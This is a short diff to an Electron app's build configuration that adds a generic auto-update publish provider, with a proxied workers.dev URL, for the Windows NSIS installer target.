@@ -12,6 +12,9 @@ files:
 publish: null
 win:
   target: [nsis]
+  publish:
+    provider: generic
+    url: 'https://p.mise.run.place/https://update-class-tools.lukass.workers.dev'
 nsis:
   oneClick: false
   perMachine: false
